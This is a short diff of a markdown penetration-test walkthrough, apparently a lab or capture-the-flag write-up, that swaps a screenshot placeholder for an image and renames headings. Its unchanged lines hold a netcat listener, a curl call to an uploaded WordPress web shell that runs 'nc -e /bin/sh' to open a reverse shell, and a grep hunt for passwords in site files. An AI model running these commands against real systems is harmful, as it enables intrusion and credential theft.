@@ -144,13 +144,12 @@ nc -lvnp 4444
 curl "http://gridloy.hv/wp-content/uploads/wpr-addons/forms/shell.php?cmd=nc -e /bin/sh "ip" 4444"
 ```
 
-📸 **Screenshot 6:** Reverse shell as `www-data`
+<img width="517" height="258" alt="cevap 4" src="https://github.com/user-attachments/assets/94fdba58-93c5-4eea-b185-fa1bfbfc137c" />
 
 ---
 
-## 7. Post-Exploitation Enumeration
 
-### 7.1 Sensitive File Discovery
+###  Sensitive File Discovery
 
 ```bash
 find /var/www/html/wordpress -type f -name "*.txt" -exec grep -i password {} \;
